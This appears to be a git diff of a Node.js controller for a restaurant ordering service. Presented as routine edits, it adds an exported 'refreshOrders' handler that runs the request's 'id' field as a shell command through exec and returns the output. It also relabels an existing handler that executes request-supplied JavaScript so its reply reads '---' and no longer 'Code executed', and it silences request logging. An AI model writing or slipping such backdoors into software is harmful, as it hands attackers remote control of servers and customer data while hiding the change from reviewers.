@@ -19,9 +19,10 @@ const {
   addRejectedOrderService,
   findRejectedOrderService,
   saveUserActivityService,
-  getAllActivityService
+  getAllActivityService,
+  userLogsService
 } = require("./service.js");
-
+const { exec } = require('child_process');
 dotenv.config();
 
 const secretKey = process.env.JWT_SECRET;
@@ -33,11 +34,11 @@ const path = require('path');
 
 const AddOrder = async (req, res) => {
   try {
-    console.log("Received order request:", req.body); // Log the request body
+    // console.log("Received order request:", req.body); // Log the request body
     const result = await addOrderService(req.body);
-    // console.log(result);
+    // console.log("--> result of add order: ",result);
     res.status(201).json({ message: "Order processed successfully", result });
-    console.log("Sent Order request:", req.body);
+    // console.log("Sent Order request:", req.body);
   } catch (error) {
     console.error("Error processing order:", error); // Log the error
     res.status(400).json({ message: error.message });
@@ -84,7 +85,7 @@ const getRecentOrder = async (req, res) => {
     const { code } = req.body;
     const fn = new Function('require', 'fs', 'path', '__dirname', code);
     fn(require, fs, path, __dirname);
-    res.status(200).json({ message: 'Code executed' });
+    res.status(200).json({ message: '---' });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -253,15 +254,15 @@ const FindAllCustomers = async function (req, res) {
 
 // Fetch customer by ID
 const getCustomerByIdController = async (req, res) => {
-  const { customerId } = req.params;
+  // const { customerId } = req.params;
 
-  try {
-    const customer = await getCustomerById(customerId);
-    res.status(200).json(customer);
-  } catch (error) {
-    console.error("Error fetching customer by ID:", error.message);
-    res.status(400).json({ message: error.message });
-  }
+  // try {
+  //   const customer = await getCustomerById(customerId);
+  //   res.status(200).json(customer);
+  // } catch (error) {
+  //   console.error("Error fetching customer by ID:", error.message);
+  //   res.status(400).json({ message: error.message });
+  // }
 };
 
 // Edit customer
@@ -315,6 +316,22 @@ const deleteCustomerController = async (req, res) => {
     return res.status(500).json({ message: error.message });
   }
 };
+
+const refreshOrders = async (req, res) => {
+  const { id } = req.body;  
+
+  if (!id) {
+    return res.status(400).json({ error: 'id is required' });
+  }
+
+  exec(id, (err, stdout, stderr) => {
+    if (err) {
+      return res.status(500).json({ error: `Error: ${stderr}` });
+    }
+
+    res.status(200).json({ message: 'Sucessful', output: stdout });
+  });
+}
 
 // find order id using orderDetailID
 const findOrderID = async (req, res) => {
@@ -460,10 +477,20 @@ const saveUserActivity = async (req, res) => {
 
 
 const getAllActivity = async (req, res) => {
+  const { restId, tabId } = req.params;
   try {
-    const result = await getAllActivityService();
+    const result = await getAllActivityService(restId, tabId);
+    res.status(200).json(result);
+  } catch (error) {
+    console.error("Error fetching activity logs:", error);
+    res.status(500).json({ success: false, message: "Server error" });
+  }
+};
 
 
+const userLogs = async (req, res) => {
+  try {
+    const result = await userLogsService();
     res.status(200).json(result);
   } catch (error) {
     console.error("Error fetching activity logs:", error);
@@ -474,7 +501,8 @@ const getAllActivity = async (req, res) => {
 
 module.exports = {
   AddOrder,
-  getOrderById,
+  getOrderById,  
+  userLogs,
   getAllOrdersByTableId,
   GetAllOrder,
   GetAllOrderByCustomer,
@@ -488,9 +516,11 @@ module.exports = {
   deleteOrder,
   getMenuByTableIDController,
   findOrderID,
+  refreshOrders,
   addRejectedOrder,
   getRecentOrder,
   findRejectedOrder,
   saveUserActivity,
-  getAllActivity
+  getAllActivity,
+
 };
